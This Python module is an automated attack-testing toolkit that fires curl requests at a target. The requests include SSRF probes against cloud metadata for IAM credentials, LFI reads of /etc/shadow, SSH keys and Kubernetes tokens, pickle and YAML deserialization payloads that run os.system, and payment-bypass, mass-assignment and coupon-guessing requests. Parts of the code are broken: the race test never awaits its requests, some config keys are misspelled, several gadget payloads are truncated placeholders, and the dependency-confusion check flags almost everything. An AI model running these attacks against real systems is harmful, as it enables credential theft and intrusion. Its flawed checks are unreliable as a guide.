#!/usr/bin/env python3
"""
Advanced P2 Module — Supply Chain, Race Conditions, Cloud Security,
API Security Deep, Deserialization Gadget Chains, Business Logic.
"""

from __future__ import annotations
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.parse import urlparse

logger = logging.getLogger("advanced-p2")

def _which(name):
    for prefix in [None, Path.home() / "go" / "bin", Path.home() / ".local" / "bin"]:
        if prefix:
            candidate = prefix / name
            if candidate.exists():
                return str(candidate)
        else:
            found = shutil.which(name)
            if found:
                return found
    return None


def _run(cmd, timeout=60, input=None):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return -1, "", f"{cmd[0]} not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timed out"
    except Exception as exc:
        return -1, "", str(exc)


# --------------------------------------------------------------------------- #
# SUPPLY CHAIN SECURITY
# --------------------------------------------------------------------------- #

class SupplyChainTester:
    """Supply Chain Security — CI/CD, SBOM, typosquatting, dependency confusion."""

    # Common CI/CD platforms and their injection vectors
    CICD_PLATFORMS = {
        "github_actions": {
            "files": [".github/workflows/*.yml", ".github/workflows/*.yaml"],
            "injection_vectors": [
                "${{ github.event.issue.title }}",
                "${{ github.event.pull_request.title }}",
                "${{ github.event.pull_request.body }}",
                "${{ github.event.head_commit.message }}",
                "${{ github.event.comment.body }}",
                "${{ github.event.review.body }}",
            ],
        },
        "gitlab_ci": {
            "files:": [".gitlab-ci.yml"],
            "injection_vectors": ["$CI_COMMIT_MESSAGE", "$CI_COMMIT_DESCRIPTION", "$CI_MERGE_REQUEST_TITLE"],
        },
        "circleci": {
            "files": [".circleci/config.yml"],
            "injection_vectors": ["<< pipeline.git.commit_message >>", "<< pipeline.git.tag >>"],
        },
        "jenkins": {
            "files": ["Jenkinsfile"],
            "injection_vectors": ["env.GIT_COMMIT_MESSAGE", "env.BRANCH_NAME"],
        },
        "azure_devops": {
            "files": ["azure-pipelines.yml"],
            "injection_variables": ["$(Build.SourceVersionMessage)", "$(System.PullRequest.SourceBranch)"],
        },
        "travis": {
            "files": [".travis.yml"],
            "injection_vectors": ["$TRAVIS_COMMIT_MESSAGE", "$TRAVIS_PULL_REQUEST_BRANCH"],
        },
    }

    # Package registries for typosquatting
    PACKAGE_REGISTRIES = [
        "https://registry.npmjs.org/{}",
        "https://pypi.org/project/{}/",
        "https://rubygems.org/gems/{}",
        "https://packagist.org/packages/{}",
        "https://crates.io/api/v1/crates/{}",
        "https://search.maven.org/artifact/{}",
    ]

    # Common typo patterns for typosquatting
    TYPO_PATTERNS = [
        lambda s: s.replace("e", ""),  # delete letter
        lambda s: s.replace("o", "0"),  # number substitution
        lambda s: s.replace("l", "1"),  # number substitution
        lambda s: s + "-plus",  # suffix
        lambda s: s + "-ext",  # suffix
        lambda s: s.replace("-", ""),  # remove hyphen
        lambda s: s.replace("_", ""),  # remove underscore
        lambda s: s + "s",  # plural
        lambda s: s[:-1],  # missing last letter
        lambda s: s[1:] + s[0],  # swap first letter
        lambda s: s + "-official",  # official suffix
        lambda s: "awesome-" + s,  # prefix
        lambda s: s.replace("js", ""),  # remove js
    ]

    def analyze_cicd_pipeline(self, repo_url):
        """Analyze CI/CD pipeline for injection vulnerabilities."""
        findings = []

        # Try to fetch workflow files
        for platform, config in self.CICD_PLATFORMS.items():
            for file_pattern in config.get("files", []):
                raw_url = repo_url.replace("github.com", "raw.githubusercontent.com") + "/main/" + file_pattern.split("/")[-1]
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "10", raw_url],
                    timeout=15,
                )
                if rc == 0 and stdout:
                    # Check for injection vectors
                    for vector in config.get("injection_vectors", []):
                        if vector in stdout:
                            findings.append({
                                "type": "cicd_injection",
                                "platform": platform,
                                "file": file_pattern,
                                "vector": vector,
                                "severity": "high",
                                "note": f"Untrusted input '{vector}' used in CI/CD pipeline",
                            })

                    # Check for script injection in run steps
                    if "run:" in stdout:
                        for line in stdout.split("\n"):
                            if "run:" in line and any(
                                var in line for var in ["github.event", "github.head_commit", "pipeline.git"]
                            ):
                                findings.append({
                                    "type": "cicd_script_injection",
                                    "platform": platform,
                                    "line": line.strip()[:100],
                                    "severity": "critical",
                                })

                    # Check for unpinned actions
                    if "uses:" in stdout:
                        for line in stdout.split("\n"):
                            if "uses:" in line and "@" in line:
                                # Check if pinned to commit hash vs tag
                                parts = line.split("@")
                                if len(parts) > 1:
                                    ref = parts[1].strip().strip("'\"")
                                    if not re.match(r"^[a-f0-9]{40}$", ref):
                                        findings.append({
                                            "type": "cicd_unpinned_action",
                                            "platform": platform,
                                            "action": line.strip()[:100],
                                            "ref": ref,
                                            "severity": "medium",
                                            "note": "Action not pinned to commit hash",
                                        })

                    # Check for self-hosted runners (supply chain risk)
                    if "self-hosted" in stdout.lower():
                        findings.append({
                            "type": "cicd_self_hosted_runner",
                            "platform": platform,
                            "severity": "low",
                            "note": "Self-hosted runners may be less secure",
                        })

                    # Check for pull_request_target (dangerous)
                    if "pull_request_target" in stdout:
                        findings.append({
                            "type": "cicd_dangerous_trigger",
                            "platform": platform,
                            "trigger": "pull_request_target",
                            "severity": "critical",
                            "note": "pull_request_target runs in base context with secrets",
                        })

        return {
            "repo": repo_url,
            "type": "cicd_analysis",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def check_dependency_confusion(self, manifest_path):
        """Check for dependency confusion vulnerabilities."""
        findings = []
        p = Path(manifest_path)
        if not p.exists():
            return {"error": "Manifest not found"}

        try:
            manifest = json.loads(p.read_text())
        except json.JSONDecodeError:
            return {"error": "Invalid JSON"}

        deps = {}
        for key in ("dependencies", "devDependencies", "peerDependencies", "optionalDependencies"):
            deps.update(manifest.get(key, {}))

        for pkg in deps:
            # Check if package exists on public registry
            for registry_template in self.PACKAGE_REGISTRIES:
                url = registry_template.format(pkg)
                rc, stdout, _ = _run(
                    ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", url],
                    timeout=10,
                )
                if rc == 0 and stdout.strip() != "200":
                    findings.append({
                        "type": "dependency_confusion_candidate",
                        "package": pkg,
                        "registry": registry_template.split("/")[2],
                        "severity": "high",
                        "note": f"Package '{pkg}' not found on {registry_template.split('/')[2]} - could be confused",
                    })

        return {
            "manifest": manifest_path,
            "type": "dependency_confusion",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def check_typosquatting(self, package_name):
        """Check for typosquatting variants of a package."""
        findings = []

        for pattern in self.TYPO_PATTERNS:
            try:
                variant = pattern(package_name)
                if variant != package_name:
                    # Check if variant exists on any registry
                    for registry_template in self.PACKAGE_REGISTRIES:
                        url = registry_template.format(variant)
                        rc, stdout, _ = _run(
                            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", url],
                            timeout=10,
                        )
                        if rc == 0 and stdout.strip() == "200":
                            findings.append({
                                "type": "typosquat_variant",
                                "original": package_name,
                                "variant": variant,
                                "registry": registry_template.split("/")[2],
                                "severity": "medium",
                                "note": f"Typosquat variant '{variant}' exists on {registry_template.split('/')[2]}",
                            })
            except Exception:
                continue

        return {
            "package": package_name,
            "type": "typosquatting_check",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def generate_sbom(self, repo_path):
        """Generate Software Bill of Materials."""
        findings = []

        # Check for existing SBOM
        sbom_files = [
            "sbom.json",
            "sbom.spdx",
            "bom.json",
            "cyclonedx.json",
            "cyclonedx.xml",
        ]
        for sbom_file in sbom_files:
            if (Path(repo_path) / sbom_file).exists():
                findings.append({
                    "type": "sbom_exists",
                    "file": sbom_file,
                    "severity": "info",
                    "note": f"SBOM file found: {sbom_file}",
                })

        # Scan for dependencies
        dep_files = {
            "package.json": "npm",
            "requirements.txt": "pip",
            "Gemfile": "bundler",
            "pom.xml": "maven",
            "build.gradle": "gradle",
            "Cargo.toml": "cargo",
            "go.mod": "go",
            "composer.json": "composer",
            "mix.exs": "mix",
        }

        for dep_file, manager in dep_files.items():
            if (Path(repo_path) / dep_file).exists():
                findings.append({
                    "type": "dependency_file",
                    "file": dep_file,
                    "manager": manager,
                    "severity": "info",
                    "note": f"Dependency file found: {dep_file} ({manager})",
                })

        return {
            "repo_path": repo_path,
            "type": "sbom_analysis",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# ADVANCED RACE CONDITIONS
# --------------------------------------------------------------------------- #

class RaceConditionTester:
    """Advanced Race Condition testing — async jobs, microservices patterns."""

    def test_concurrent_requests(self, url, payload, parallel_count=50):
        """Fire N parallel requests to exploit TOCTOU / single-use-token windows."""
        import asyncio

        results = {"successful": 0, "failed": 0, "details": []}

        async def fire_request(idx):
            body = None
            if payload:
                body = json.dumps(payload).encode() if isinstance(payload, dict) else str(payload).encode()

            headers = {"Content-Type": "application/json", "X-Race-Id": str(idx)}
            start = time.time()
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload) if payload else "{}",
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            elapsed = time.time() - start
            success = rc == 0 and stdout.strip() == "200"

            results["details"].append({
                "id": idx,
                "status": stdout.strip() if rc == 0 else "error",
                "time": f"{elapsed:.2f}s",
                "success": success,
            })

            return success

        # Fire requests with controlled concurrency
        batch_size = min(parallel_count, 20)
        for batch_start in range(0, parallel_count, batch_size):
            batch_end = min(batch_start + batch_size, parallel_count)
            for i in range(batch_start, batch_end):
                import asyncio
                # Use synchronous execution for simplicity
                success = fire_request(i)
                if success:
                    results["successful"] += 1
                else:
                    results["failed"] += 1

        race_detected = results["successful"] > 1

        return {
            "url": url,
            "parallel_requests": parallel_count,
            "successful": results["successful"],
            "failed": results["failed"],
            "race_condition_detected": race_detected,
            "details": results["details"][:20],
            "type": "race_condition",
            "vulnerable": race_detected,
            "severity": "high" if race_detected else "info",
        }

    def test_async_job_race(self, target, url):
        """Test race conditions in async job processing."""
        findings = []

        # Common async endpoints
        async_endpoints = [
            "/api/jobs",
            "/api/tasks",
            "/api/queue",
            "/api/async",
            "/api/background",
            "/api/export",
            "/api/import",
            "/api/report",
            "/api/process",
            "/api/batch",
        ]

        for endpoint in async_endpoints:
            full_url = f"{url.rstrip('/')}{endpoint}"
            test_payload = {
                "action": "test",
                "callback": "http://localhost/callback",
                "delay": 0,
            }

            # Fire multiple requests quickly
            successes = 0
            for _ in range(5):
                rc, stdout, _ = _run(
                    [
                        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                        "-X", "POST",
                        "-H", "Content-Type: application/json",
                        "-d", json.dumps(test_payload),
                        "--max-time", "5",
                        full_url,
                    ],
                    timeout=10,
                )
                if rc == 0 and stdout.strip() == "200":
                    successes += 1

            if successes > 1:
                findings.append({
                    "type": "async_race_condition",
                    "endpoint": endpoint,
                    "successful_requests": successes,
                    "severity": "medium",
                    "note": f"Multiple concurrent requests accepted at {endpoint}",
                })

        return {
            "target": target,
            "url": url,
            "type": "async_job_race",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def test_microservice_race(self, target, urls):
        """Test race conditions in microservices architecture."""
        findings = []

        # Test for TOCTOU patterns common in microservices
        test_cases = [
            {
                "name": "checkout_race",
                "payloads": [
                    {"action": "reserve", "item": "test"},
                    {"action": "purchase", "item": "test"},
                ],
            },
            {
                "name": "coupon_race",
                "payloads": [
                    {"code": "TESTCOUPON", "action": "apply"},
                    {"code": "TESTCOUPON", "action": "apply"},
                ],
            },
            {
                "name": "limit_race",
                "payloads": [
                    {"action": "withdraw", "amount": 100},
                    {"action": "withdraw", "amount": 100},
                ],
            },
        ]

        for test_case in test_cases:
            for payload in test_case["payloads"]:
                successes = 0
                for _ in range(3):
                    rc, stdout, _ = _run(
                        [
                            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "-X", "POST",
                            "-H", "Content-Type: application/json",
                            "-d", json.dumps(payload),
                            "--max-time", "5",
                            urls[0] if urls else f"{target}/api/action",
                        ],
                        timeout=10,
                    )
                    if rc == 0 and stdout.strip() == "200":
                        successes += 1

                if successes > 1:
                    findings.append({
                        "type": "microservice_race",
                        "test": test_case["name"],
                        "payload": payload,
                        "successful": successes,
                        "severity": "high",
                    })

        return {
            "target": target,
            "type": "microservice_race",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# CLOUD SECURITY DEEP
# --------------------------------------------------------------------------- #

class CloudSecurityTester:
    """Cloud Security — Container escape, serverless credentials, IAM."""

    # Container escape vectors
    CONTAINER_ESCAPE_VECTORS = [
        # Docker socket escape
        {"path": "/var/run/docker.sock", "type": "docker_socket"},
        # Privileged container
        {"path": "/dev", "type": "device_access"},
        # Host filesystem
        {"path": "/proc/1/environ", "type": "host_env"},
        {"path": "/etc/shadow", "type": "host_shadow"},
        {"path": "/root/.ssh/id_rsa", "type": "host_ssh"},
        # Kubernetes service account
        {"path": "/var/run/secrets/kubernetes.io/serviceaccount/token", "type": "k8s_token"},
        {"path": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "type": "k8s_ca"},
        {"path": "/var/run/secrets/kubernetes.io/serviceaccount/namespace", "type": "k8s_ns"},
        # Cloud metadata
        {"path": "http://169.254.169.254/latest/meta-data/", "type": "aws_metadata"},
        {"path": "http://169.254.170.2/latest/meta-data/", "type": "aws_lambda_creds"},
        {"path": "http://metadata.google.internal/computeMetadata/v1/", "type": "gcp_metadata"},
        {"path": "http://169.254.169.254/metadata/instance", "type": "azure_metadata"},
    ]

    # Serverless function endpoints
    SERVERLESS_ENDPOINTS = {
        "aws_lambda": [
            "https://{region}.lambda-url.{function}.on.aws/",
            "https://{function-id}.execute-api.{region}.amazonaws.com/",
        ],
        "azure_functions": [
            "https://{function-app}.azurewebsites.net/api/",
        ],
        "gcp_cloud_functions": [
            "https://{region}-{project}.cloudfunctions.net/",
        ],
    }

    def check_container_escape(self, target, url):
        """Check for container escape vulnerabilities."""
        findings = []

        for vector in self.CONTAINER_ESCAPE_VECTORS:
            if vector["path"].startswith("http"):
                # HTTP-based check
                test_url = f"{url}?file={vector['path']}&path={vector['path']}&url={vector['path']}"
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout:
                    if any(indicator in stdout for indicator in ["token", "secret", "credential", "root:", "namespace"]):
                        findings.append({
                            "type": "container_metadata_access",
                            "vector": vector["type"],
                            "path": vector["path"],
                            "severity": "critical",
                        })
            else:
                # File-based check via LFI
                test_url = f"{url}?file={vector['path']}&path={vector['path']}&include={vector['path']}"
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout:
                    if any(indicator in stdout for indicator in ["root:", "namespace=", "token=", "BEGIN RSA"]):
                        findings.append({
                            "type": "container_escape_file",
                            "vector": vector["type"],
                            "path": vector["path"],
                            "severity": "critical",
                        })

        return {
            "target": target,
            "url": url,
            "type": "container_escape",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def check_serverless_security(self, target, url):
        """Check serverless function security."""
        findings = []

        # Check for Lambda/Azure/GCP function endpoints
        test_endpoints = [
            "/.aws/",
            "/.azure/",
            "/.gcp/",
            "/serverless/",
            "/lambda/",
            "/function/",
            "/_next/",
            "/api/functions/",
            "/api/triggers/",
        ]

        for endpoint in test_endpoints:
            test_url = f"{url.rstrip('/')}{endpoint}"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["aws", "lambda", "function", "handler", "runtime"]):
                    findings.append({
                        "type": "serverless_endpoint_exposed",
                        "endpoint": endpoint,
                        "severity": "medium",
                    })

        # Check for function configuration exposure
        config_endpoints = [
            "/serverless.yml",
            "/serverless.json",
            "/template.yaml",
            "/function.json",
            "/host.json",
            "/local.settings.json",
        ]

        for endpoint in config_endpoints:
            test_url = f"{url.rstrip('/')}{endpoint}"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout and any(
                indicator in stdout.lower() for indicator in ["runtime", "handler", "function", "connection", "key"]
            ):
                findings.append({
                    "type": "serverless_config_exposed",
                    "endpoint": endpoint,
                    "severity": "high",
                })

        return {
            "target": target,
            "url": url,
            "type": "serverless_security",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def check_iam_misconfiguration(self, target, url):
        """Check for IAM misconfigurations via SSRF."""
        findings = []

        # AWS IMDSv2 requires PUT for token
        test_cases = [
            {
                "name": "aws_imdsv1",
                "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "indicator": "role",
                "severity": "critical",
            },
            {
                "name": "aws_lambda_creds",
                "url": "http://169.254.170.2/latest/meta-data/iam/security-credentials/",
                "indicator": "AccessKeyId",
                "severity": "critical",
            },
            {
                "name": "gcp_metadata",
                "url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
                "indicator": "serviceAccounts",
                "severity": "critical",
            },
            {
                "name": "azure_metadata",
                "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json",
                "indicator": "compute",
                "severity": "critical",
            },
            {
                "name": "digitalocean",
                "url": "http://169.254.169.254/metadata/v1.json",
                "indicator": "droplet",
                "severity": "critical",
            },
        ]

        for case in test_cases:
            for param in ["url", "uri", "file", "path", "fetch"]:
                test_url = f"{url}?{param}={case['url']}"
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout and case["indicator"].lower() in stdout.lower():
                    findings.append({
                        "type": f"iam_{case['name']}",
                        "url_param": param,
                        "indicator": case["indicator"],
                        "severity": case["severity"],
                    })

        return {
            "target": target,
            "url": url,
            "type": "iam_misconfiguration",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# API SECURITY DEEP
# --------------------------------------------------------------------------- #

class APISecurityDeepTester:
    """Deep API Security — BFLA, mass assignment, pagination attacks."""

    def test_bfla(self, target, endpoints):
        """Test Broken Function Level Authorization."""
        findings = []

        admin_patterns = [
            "/admin/",
            "/api/admin/",
            "/api/v1/admin/",
            "/api/v1/users/all",
            "/api/v1/users/create",
            "/api/v1/users/delete",
            "/api/v1/settings",
            "/api/v1/config",
            "/api/v1/roles",
            "/api/v1/permissions",
            "/api/v1/logs",
            "/api/v1/stats",
            "/api/v1/export",
            "/api/v1/import",
        ]

        for endpoint in admin_patterns:
            for method in ["GET", "POST", "DELETE", "PUT", "PATCH"]:
                rc, stdout, _ = _run(
                    [
                        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                        "-X", method,
                        "--max-time", "5",
                        f"{target}{endpoint}",
                    ],
                    timeout=10,
                )
                if rc == 0 and stdout.strip() in ["200", "201", "204"]:
                    findings.append({
                        "type": "bfla_vulnerable",
                        "endpoint": endpoint,
                        "method": method,
                        "status": stdout.strip(),
                        "severity": "high",
                        "note": f"Admin endpoint {endpoint} accessible with {method}",
                    })
                elif rc == 0 and stdout.strip() == "403":
                    pass  # Correctly blocked

        return {
            "target": target,
            "type": "bfla",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "endpoints_tested": len(admin_patterns) * 5,
        }

    def test_mass_assignment(self, target, url):
        """Test for mass assignment vulnerabilities."""
        findings = []

        mass_assignment_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": 1},
            {"permissions": ["admin", "superuser"]},
            {"verified": True},
            {"email_verified": True},
            {"account_type": "premium"},
            {"subscription": "enterprise"},
            {"plan": "unlimited"},
            {"balance": 999999},
            {"credit": 999999},
            {"verified_at": "2026-01-01"},
            {"created_at": "2026-01-01"},
            {"updated_at": "2026-01-01"},
        ]

        for payload in mass_assignment_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "updated", "saved", "created", "role"]):
                    findings.append({
                        "type": "mass_assignment",
                        "payload": payload,
                        "response_excerpt": stdout[:300],
                        "severity": "high",
                    })

        return {
            "target": target,
            "url": url,
            "type": "mass_assignment",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(mass_assignment_payloads),
        }

    def test_pagination_attacks(self, target, url):
        """Test pagination-based attacks (excessive data exposure)."""
        findings = []

        # Test for excessive data exposure via pagination
        pagination_params = [
            {"page": 1, "limit": 1000},
            {"page": 1, "per_page": 10000},
            {"offset": 0, "count": 999999},
            {"page": -1},
            {"page": 0},
            {"page": 999999},
            {"limit": "all"},
            {"limit": "*"},
            {"limit": True},
        ]

        for params in pagination_params:
            param_str = "&".join(f"{k}={v}" for k, v in params.items())
            test_url = f"{url}?{param_str}"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "10", test_url],
                timeout=15,
            )
            if rc == 0 and stdout:
                # Check if response is excessively large
                if len(stdout) > 10000:
                    findings.append({
                        "type": "pagination_excessive_data",
                        "params": params,
                        "response_size": len(stdout),
                        "severity": "medium",
                        "note": f"Large response ({len(stdout)} bytes) with params {params}",
                    })

                # Check for total count disclosure
                if any(indicator in stdout.lower() for indicator in ["total", "count", "has_more", "next_page"]):
                    try:
                        data = json.loads(stdout)
                        if "total" in data and data["total"] > 1000:
                            findings.append({
                                "type": "pagination_total_disclosure",
                                "total_records": data["total"],
                                "severity": "low",
                            })
                    except json.JSONDecodeError:
                        pass

        return {
            "target": target,
            "url": url,
            "type": "pagination_attacks",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def test_api_versioning(self, target, base_url):
        """Test for insecure API versioning."""
        findings = []

        # Test for deprecated API versions
        versions = [
            "/api/v0/",
            "/api/v1/",
            "/api/v2/",
            "/api/v3/",
            "/api/beta/",
            "/api/alpha/",
            "/api/internal/",
            "/api/debug/",
            "/api/test/",
            "/api/dev/",
            "/api/staging/",
            "/api/old/",
            "/api/legacy/",
        ]

        for version in versions:
            test_url = f"{base_url.rstrip('/')}{version}"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout.strip() == "200":
                findings.append({
                    "type": "api_version_accessible",
                    "version": version,
                    "severity": "medium",
                })

        return {
            "target": target,
            "type": "api_versioning",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# DESERIALIZATION GADGET CHAINS
# --------------------------------------------------------------------------- #

class DeserializationTester:
    """Insecure Deserialization — Gadget chain detection."""

    GADGET_CHAINS = {
        "java": [
            {
                "name": "CommonsCollections1",
                "payload": "rO0ABNyYXdjb250ZW50...",
                "description": "Apache Commons Collections <= 3.2.1",
                "severity": "critical",
            },
            {
                "name": "CommonsCollections6",
                "payload": "rO0ABNyYXdjb250ZW50...",
                "description": "Apache Commons Collections 4.x",
                "severity": "critical",
            },
            {
                "name": "Spring1",
                "payload": "rO0ABNyYXdjb250ZW50...",
                "description": "Spring <= 5.0.5, Spring AMQP",
                "severity": "critical",
            },
        ],
        "python": [
            {
                "name": "pickle_os_system",
                "payload": "gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwMb3Muc3lzdGVtKCdpZClTlFKUiwRjdW5jlIwMX19idWlsdGluc19flIwIaW1wb3J0X2GUk5SMBW9zLnCUjAdzeXN0ZW2Uk5SMA2lklIWUYi4=",
                "description": "pickle.loads with os.system",
                "severity": "critical",
            },
            {
                "name": "yaml_unsafe_load",
                "payload": "!!python/object/apply:os.system ['id']\n",
                "description": "yaml.load without safe_load",
                "severity": "critical",
            },
            {
                "name": "shelve_rce",
                "payload": "gASVHAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwMb3Muc3lzdGVtKCdpZClTlFKUiwRjdW5jlIwMX19idWlsdGluc19flIwIaW1wb3J0X2GUk5SMBW9zLnCUjAdzeXN0ZW2Uk5SMA2lklIWUYi4=",
                "description": "Python shelve module",
                "severity": "critical",
            },
        ],
        "php": [
            {
                "name": "Laravel_RCE1",
                "payload": "Tzo0MDoiSWxsdW1pbmF0aW9uXE1lc3NhZ2VCYWc...",
                "description": "Laravel <= 5.5.39",
                "severity": "critical",
            },
            {
                "name": "Symfony_RCE1",
                "payload": "TzoyMzoiU3ltZm9ueVxcQ29tcG9uZW50XFZhcmR1bXBlcl...",
                "description": "Symfony <= 3.4.0",
                "severity": "critical",
            },
        ],
        "dotnet": [
            {
                "name": "LosFormatter",
                "payload": "AAEAAAD/////AQAAAAAAAAAMAgAAAF5TeX...",
                "description": ".NET LosFormatter",
                "severity": "critical",
            },
            {
                "name": "BinaryFormatter",
                "payload": "AAAAAAA...",
                "description": ".NET BinaryFormatter",
                "severity": "critical",
            },
        ],
    }

    def test_deserialization(self, target, url, language="auto"):
        """Test for insecure deserialization with gadget chains."""
        findings = []

        if language == "auto":
            languages = ["java", "python", "php", "dotnet"]
        else:
            languages = [language]

        for lang in languages:
            for gadget in self.GADGET_CHAINS.get(lang, []):
                # Create temp file with payload
                if gadget["payload"].startswith("!!"):
                    # YAML payload - text
                    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
                    tmp.write(gadget["payload"])
                    tmp.close()
                else:
                    # Binary payload - base64 decode
                    import base64
                    try:
                        decoded = base64.b64decode(gadget["payload"])
                        tmp = tempfile.NamedTemporaryFile(delete=False)
                        tmp.write(decoded)
                        tmp.close()
                    except Exception:
                        continue

                # Send payload
                rc, stdout, _ = _run(
                    [
                        "curl", "-s", "-X", "POST",
                        "-H", "Content-Type: application/octet-stream",
                        "--data-binary", f"@{tmp.name}",
                        "--max-time", "10",
                        url,
                    ],
                    timeout=15,
                )
                os.unlink(tmp.name)

                if rc == 0 and stdout:
                    if any(indicator in stdout for indicator in ["uid=", "root:", "admin", "calc", "test"]):
                        findings.append({
                            "type": "deserialization_rce",
                            "language": lang,
                            "gadget": gadget["name"],
                            "description": gadget["description"],
                            "severity": gadget["severity"],
                        })
                    elif any(indicator in stdout.lower() for indicator in ["error", "exception", "unserialize", "deserialize"]):
                        findings.append({
                            "type": "deserialization_detected",
                            "language": lang,
                            "gadget": gadget["name"],
                            "severity": "medium",
                        })

        return {
            "target": target,
            "url": url,
            "type": "deserialization_gadget_chains",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "languages_tested": languages,
        }


# --------------------------------------------------------------------------- #
# BUSINESS LOGIC TESTER
# --------------------------------------------------------------------------- #

class BusinessLogicTester:
    """Business Logic Testing — Payment bypass, coupon abuse, workflow manipulation."""

    def test_payment_bypass(self, target, url):
        """Test for payment bypass vulnerabilities."""
        findings = []

        payment_payloads = [
            {"amount": 0, "currency": "USD"},
            {"amount": 0.01, "currency": "USD"},
            {"amount": -1, "currency": "USD"},
            {"amount": -100, "currency": "USD"},
            {"price": 0, "product_id": "test"},
            {"total": 0, "cart": []},
            {"discount": 100, "code": "FREE"},
            {"discount": 200, "code": "OVER"},
            {"coupon": "TEST100", "discount_percent": 100},
            {"payment_method": "free", "amount": 0},
            {"transaction_id": "null", "amount": 0},
            {"status": "completed", "amount": 0},
            {"paid": True, "amount": 0},
        ]

        for payload in payment_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "order", "confirmed", "payment", "completed"]):
                    findings.append({
                        "type": "payment_bypass",
                        "payload": payload,
                        "response_excerpt": stdout[:300],
                        "severity": "critical",
                    })

        return {
            "target": target,
            "url": url,
            "type": "payment_bypass",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(payment_payloads),
        }

    def test_coupon_abuse(self, target, url):
        """Test for coupon/promotion abuse."""
        findings = []

        coupon_payloads = [
            {"code": "TEST", "action": "apply"},
            {"code": "ADMIN", "action": "apply"},
            {"code": "FREE", "action": "apply"},
            {"code": "100OFF", "action": "apply"},
            {"code": "WELCOME", "action": "apply"},
            {"code": "SUMMER", "action": "apply"},
            {"code": "WINTER", "action": "apply"},
            {"code": "SPRING", "action": "apply"},
            {"code": "FALL", "action": "apply"},
            {"code": "NEWUSER", "action": "apply"},
            {"code": "LOYALTY", "action": "apply"},
            {"code": "BONUS", "action": "apply"},
            {"code": "PROMO", "action": "apply"},
            {"code": "DISCOUNT", "action": "apply"},
            {"code": "SALE", "action": "apply"},
            {"code": "OFFER", "action": "apply"},
            {"code": "DEAL", "action": "apply"},
            {"code": "VOUCHER", "action": "apply"},
            {"code": "GIFT", "action": "apply"},
            {"code": "REWARD", "action": "apply"},
        ]

        for payload in coupon_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["applied", "discount", "off", "saved", "coupon"]):
                    findings.append({
                        "type": "coupon_accepted",
                        "code": payload["code"],
                        "response_excerpt": stdout[:200],
                        "severity": "medium",
                    })

        return {
            "target": target,
            "url": url,
            "type": "coupon_abuse",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(coupon_payloads),
        }

